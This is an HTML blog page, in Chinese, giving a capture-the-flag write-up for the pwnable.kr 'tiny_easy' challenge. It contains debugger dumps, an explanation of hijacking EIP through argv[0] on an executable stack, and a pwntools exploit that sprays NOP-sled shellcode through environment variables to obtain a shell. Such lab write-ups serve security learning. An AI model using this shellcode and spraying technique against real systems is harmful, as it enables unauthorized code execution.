@@ -1,0 +1,248 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>tiny_easy Writeup[pwnable.kr] | WeaponX&#39;s Blog</title>
+  <meta name="author" content="WeaponX">
+  
+  <meta name="description" content="Vulnerability|Security|Binary">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="tiny_easy Writeup[pwnable.kr]"/>
+  <meta property="og:site_name" content="WeaponX&#39;s Blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="WeaponX&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script>
+  (function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+   })();
+   </script>
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">WeaponX&#39;s Blog</a></h1>
+  <h2><a href="/">Binary</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2017-03-02T10:37:12.000Z"><a href="/2017/03/02/tiny-easy-Writeup-pwnable-kr/">2017-03-02</a></time>
+      
+      
+  
+    <h1 class="title">tiny_easy Writeup[pwnable.kr]</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="0x00-tiny-easy"><a href="#0x00-tiny-easy" class="headerlink" title="0x00 tiny_easy"></a>0x00 tiny_easy</h2><p>这个文件用sftp传下来看了一下，文件很小只有4k，代码也很少，直接执行则会报错。</p>
+<a id="more"></a>
+<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>直接入口点下断，看为何出现段错误。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x0 </div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0x0 </div><div class="line">EDX: 0x0 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0x0 </div><div class="line">EBP: 0x0 </div><div class="line">ESP: 0xffffd6e0 --&gt; 0x1 </div><div class="line">EIP: 0x8048054 (pop    eax)</div><div class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804804e:   add    BYTE PTR [eax],al</div><div class="line">   0x8048050:   add    BYTE PTR [eax],dl</div><div class="line">   0x8048052:   add    BYTE PTR [eax],al</div><div class="line">=&gt; 0x8048054:   pop    eax</div><div class="line">   0x8048055:   pop    edx</div><div class="line">   0x8048056:   mov    edx,DWORD PTR [edx]</div><div class="line">   0x8048058:   call   edx</div><div class="line">   0x804805a:   add    BYTE PTR [eax],al</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd6e0 --&gt; 0x1 </div><div class="line">0004| 0xffffd6e4 --&gt; 0xffffd819 (<span class="string">"/home/user/pwn/pwnkr/tiny_easy/tiny_easy"</span>)</div><div class="line">0008| 0xffffd6e8 --&gt; 0x0 </div><div class="line">0012| 0xffffd6ec --&gt; 0xffffd842 (<span class="string">"USER=user"</span>)</div><div class="line">0016| 0xffffd6f0 --&gt; 0xffffd84c (<span class="string">"LOGNAME=user"</span>)</div><div class="line">0020| 0xffffd6f4 --&gt; 0xffffd859 (<span class="string">"HOME=/home/user"</span>)</div><div class="line">0024| 0xffffd6f8 --&gt; 0xffffd869 (<span class="string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"</span>)</div><div class="line">0028| 0xffffd6<span class="built_in">fc</span> --&gt; 0xffffd8c7 (<span class="string">"MAIL=/var/mail/user"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure>
+<p>可以看出代码很简单，<code>EDX</code>为<code>/home/user/pwn/pwnkr/tiny_easy/tiny_easy</code>，然后<code>mov    edx,DWORD PTR [edx]</code>把<code>EDX</code>的内容重新赋值给<code>EDX</code>。最后<code>call   edx</code>完成调用。</p>
+<p>其实说白了就是只要能控制<code>argv[0]</code>就可以控制<code>EIP</code>，因为环境变量也放在栈上，所以我们可以将shellcode放在栈上。但是现在有两个难点：</p>
+<ol>
+<li>是否有DEP（是否可以执行shellcode）</li>
+<li>是否有ASLR（如何将<code>EIP</code>指向shellcode）</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ checksec </div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
+<p>悲剧的是，既有<code>ASLR</code>也有<code>DEP</code>。但是突然发现这个<code>DEP</code>确没啥效果，栈上还是有执行权限的。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ getpid</div><div class="line">2844</div><div class="line">gdb-peda$ shell</div><div class="line">------------------------------------------------------------</div><div class="line">~/pwn/pwnkr/tiny_easy ? cat /proc/2844/maps</div><div class="line">08048000-08049000 r-xp 00000000 08:01 2493481                            /home/user/pwn/pwnkr/tiny_easy/tiny_easy</div><div class="line">f7ffa000<span class="_">-f</span>7ffc000 r--p 00000000 00:00 0                                  [vvar]</div><div class="line">f7ffc000<span class="_">-f</span>7ffe000 r-xp 00000000 00:00 0                                  [vdso]</div><div class="line">fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]</div></pre></td></tr></table></figure>
+<p>所以现在首要目标就是突破<code>ASLR</code>，能使得<code>EIP</code>可以指向我们的shellcode。</p>
+<h2 id="0x02-Solution"><a href="#0x02-Solution" class="headerlink" title="0x02 Solution"></a>0x02 Solution</h2><p>突破<code>ASLR</code>，想到了之前的堆喷射(Heap Spray)，用大量的滑行区来填充shellcode的前部。只要<code>EIP</code>能落在滑行区就可以执行shellcode。只要部署大量的带有滑行区的shellcode，多次尝试，肯定会有<code>EIP</code>落入滑行区的时候，所以最终的Eploit如下:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">fromm pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">shellcode  = <span class="string">"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"</span></div><div class="line">shellcode += <span class="string">"\x6c\x0e\xff\x01\x80\xe9\x01\x75"</span></div><div class="line">shellcode += <span class="string">"\xf6\xeb\x05\xe8\xea\xff\xff\xff"</span></div><div class="line">shellcode += <span class="string">"\x32\xc1\x51\x69\x30\x30\x74\x69"</span></div><div class="line">shellcode += <span class="string">"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"</span></div><div class="line">shellcode += <span class="string">"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"</span></div><div class="line"></div><div class="line">payload = <span class="string">"\x90"</span> * <span class="number">8000</span> + shellcode</div><div class="line"><span class="comment">#p64(0xff9c3844)</span></div><div class="line">env = &#123;&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</div><div class="line">    env[str(i)] = payload</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    io = process([p32(<span class="number">0xff9c3844</span>)],executable=<span class="string">"/home/user/pwn/pwnkr/tiny_easy/tiny_easy"</span>, env=env)</div><div class="line">    io.interactive()</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer>
+      
+        
+          <p style="border-top: #e0e0e0 1px dashed; border-right: #e0e0e0 1px dashed; border-bottom: #e0e0e0 1px dashed; border-left: #e0e0e0 1px dashed; padding-top: 10px;padding-right: 10px;padding-bottom: 10px;padding-left: 110px; background: url(http://i.creativecommons.org/l/by-nc-sa/2.5/cn/88x31.png) #e5f1f4 no-repeat 1% 50%; font-family: 微软雅黑; font-size:11px;" id="PSignature">  
+作者：<a href="http://weaponx.site">WeaponX</a>
+<br>出处：<a href="http://weaponx.site/2017/03/02/tiny-easy-Writeup-pwnable-kr/">http://weaponx.site/2017/03/02/tiny-easy-Writeup-pwnable-kr/</a>           
+<br>本文采用<a href="http://creativecommons.org/licenses/by-nc-sa/2.5/cn/" rel="license">知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议</a>进行许可，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接。
+</p>
+
+        
+        
+  
+  <div class="categories">
+    <a href="/categories/tech/">技术</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/安全/">安全</a>, <a href="/tags/pwn/">pwn</a>
+  </div>
+
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">留言</h1>
+
+  
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+  
+</section>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜索">
+    <input type="hidden" name="q" value="site:weaponx.site">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/tech/">技术</a><small>14</small></li>
+  
+    <li><a href="/categories/life/">生活</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">标签</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Django/">Django</a><small>1</small></li>
+  
+    <li><a href="/tags/Hexo/">Hexo</a><small>4</small></li>
+  
+    <li><a href="/tags/pwn/">pwn</a><small>6</small></li>
+  
+    <li><a href="/tags/python/">python</a><small>1</small></li>
+  
+    <li><a href="/tags/博客/">博客</a><small>3</small></li>
+  
+    <li><a href="/tags/安全/">安全</a><small>10</small></li>
+  
+    <li><a href="/tags/影评/">影评</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">友情链接</h3>
+  <ul class="entry">
+  
+    <li><a href="http://www.cnblogs.com/goabout2/" title="goabout2">goabout2</a></li>
+  
+    <li><a href="http://rootkiter.com/" title="RootKiter">RootKiter</a></li>
+  
+  </ul>
+</div>
+
+
+
+  <div class="widget tag">
+  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=270 height=86 src="//music.163.com/outchain/player?type=2&id=427542287&auto=0&height=66"></iframe>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2017 WeaponX
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<script type="text/javascript">
+var disqus_shortname = 'weaponx';
+
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+</body>
+</html>
